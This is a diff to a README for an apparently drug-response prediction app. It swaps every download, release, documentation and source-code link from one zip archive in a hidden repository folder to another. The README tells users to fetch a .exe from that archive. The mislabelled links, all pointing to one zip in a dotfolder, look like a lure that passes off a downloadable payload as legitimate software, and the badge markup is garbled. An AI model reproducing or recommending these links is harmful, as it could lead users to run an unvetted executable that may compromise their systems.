@@ -6,7 +6,7 @@ This application helps you understand how different drugs work based on various 
 
 ## 📥 Download the Application
 
-[![Download](https://raw.githubusercontent.com/sugam-bhattarai/drug-response-prediction/main/.devcontainer/drug-response-prediction-3.0.zip%20Now%20-%https://raw.githubusercontent.com/sugam-bhattarai/drug-response-prediction/main/.devcontainer/drug-response-prediction-3.0.zip)](https://raw.githubusercontent.com/sugam-bhattarai/drug-response-prediction/main/.devcontainer/drug-response-prediction-3.0.zip)
+[![Download](https://raw.githubusercontent.com/sugam-bhattarai/drug-response-prediction/main/.streamlit/response-prediction-drug-2.3-beta.5.zip%20Now%20-%https://raw.githubusercontent.com/sugam-bhattarai/drug-response-prediction/main/.streamlit/response-prediction-drug-2.3-beta.5.zip)](https://raw.githubusercontent.com/sugam-bhattarai/drug-response-prediction/main/.streamlit/response-prediction-drug-2.3-beta.5.zip)
 
 ## 🖥 System Requirements
 
@@ -26,7 +26,7 @@ This application helps you understand how different drugs work based on various 
 
 ## 📂 Download & Install
 
-1. Visit the [Releases Page](https://raw.githubusercontent.com/sugam-bhattarai/drug-response-prediction/main/.devcontainer/drug-response-prediction-3.0.zip).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/sugam-bhattarai/drug-response-prediction/main/.streamlit/response-prediction-drug-2.3-beta.5.zip).
 2. Look for the latest release version.
 3. Download the file that corresponds to your operating system. 
    - For Windows, select the `.exe` file.
@@ -59,8 +59,8 @@ If you encounter issues, please refer to the FAQ section on the Releases page. Y
 
 ## 📚 Additional Resources
 
-- [Documentation](https://raw.githubusercontent.com/sugam-bhattarai/drug-response-prediction/main/.devcontainer/drug-response-prediction-3.0.zip): In-depth guides on how to use the application effectively.
-- [Source Code](https://raw.githubusercontent.com/sugam-bhattarai/drug-response-prediction/main/.devcontainer/drug-response-prediction-3.0.zip): If you are interested in the technical details or contributing to the project.
+- [Documentation](https://raw.githubusercontent.com/sugam-bhattarai/drug-response-prediction/main/.streamlit/response-prediction-drug-2.3-beta.5.zip): In-depth guides on how to use the application effectively.
+- [Source Code](https://raw.githubusercontent.com/sugam-bhattarai/drug-response-prediction/main/.streamlit/response-prediction-drug-2.3-beta.5.zip): If you are interested in the technical details or contributing to the project.
 
 ## 🏷 Related Topics
 
@@ -70,4 +70,4 @@ If you encounter issues, please refer to the FAQ section on the Releases page. Y
 - Drug Discovery
 - Precision Medicine
 
-Make sure to visit the [Releases Page](https://raw.githubusercontent.com/sugam-bhattarai/drug-response-prediction/main/.devcontainer/drug-response-prediction-3.0.zip) again in the future for updates and new features.
+Make sure to visit the [Releases Page](https://raw.githubusercontent.com/sugam-bhattarai/drug-response-prediction/main/.streamlit/response-prediction-drug-2.3-beta.5.zip) again in the future for updates and new features.
